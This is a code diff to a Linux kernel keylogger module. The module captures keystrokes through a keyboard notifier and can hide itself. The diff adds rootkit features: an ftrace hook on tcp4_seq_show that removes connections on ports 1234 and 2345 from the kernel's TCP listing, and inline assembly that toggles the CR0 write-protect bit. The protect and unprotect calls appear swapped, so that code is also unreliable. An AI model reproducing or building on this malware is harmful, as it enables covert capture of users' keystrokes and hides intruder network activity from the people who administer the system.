@@ -4,6 +4,13 @@
 #include <linux/notifier.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/namei.h>
+#include <linux/tcp.h>
+#include "ftrace_helper.h"
 
 #ifdef HIDE_MODULE
 #include <linux/list.h>
@@ -33,6 +40,35 @@ static struct notifier_block kl_notifier_block = { .notifier_call =
 							   kl_notifier_call };
 
 static struct file_operations fops = { .read = kl_device_read };
+
+
+static unsigned long * __force_order;
+
+/* Function declaration for the original tcp4_seq_show() function that we
+ * are going to hook.
+ * */
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
+/* This is our hook function for tcp4_seq_show */
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct inet_sock *is;
+    long ret;
+    unsigned short port_in = htons(1234);
+	unsigned short port_out = htons(2345);
+
+    if (v != SEQ_START_TOKEN) {
+		is = (struct inet_sock *)v;
+		if (port_in == is->inet_sport || port_in == is->inet_dport || port_out == is->inet_sport || port_out == is->inet_dport) {
+			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+				   ntohs(is->inet_sport), ntohs(is->inet_dport));
+			return 0;
+		}
+	}
+
+	ret = orig_tcp4_seq_show(seq, v);
+	return ret;
+}
 
 static int kl_notifier_call(struct notifier_block *nb, unsigned long action,
 			    void *data)
@@ -103,10 +139,33 @@ void hideme(void)
 }
 #endif
 
+inline void cr0_write(unsigned long cr0)
+{
+    asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
+}
+
+static inline void protect_memory(void)
+{
+    unsigned long cr0 = read_cr0();
+    set_bit(16, &cr0);
+    cr0_write(cr0);
+}
+
+static inline void unprotect_memory(void)
+{
+    unsigned long cr0 = read_cr0();
+    clear_bit(16, &cr0);
+    cr0_write(cr0);
+}
+
+static struct ftrace_hook hooks[] = {
+	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+};
+
 static int __init kl_init(void)
 {
 	int ret;
-
+	int err;
 	ret = register_chrdev(0, DEVICE_NAME, &fops);
 	if (ret < 0) {
 		printk(KERN_ERR
@@ -115,8 +174,12 @@ static int __init kl_init(void)
 	}
 	major = ret;
 	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
-
+	protect_memory();
 	ret = register_keyboard_notifier(&kl_notifier_block);
+	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+	if(err)
+		return err;
+	unprotect_memory();
 	if (ret) {
 		printk(KERN_ERR
 		       "keylog: Unable to register keyboard notifier\n");
@@ -135,8 +198,11 @@ static int __init kl_init(void)
 
 static void __exit kl_exit(void)
 {
+	protect_memory();
 	unregister_chrdev(major, DEVICE_NAME);
 	unregister_keyboard_notifier(&kl_notifier_block);
+	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+	unprotect_memory();
 }
 
 module_init(kl_init);
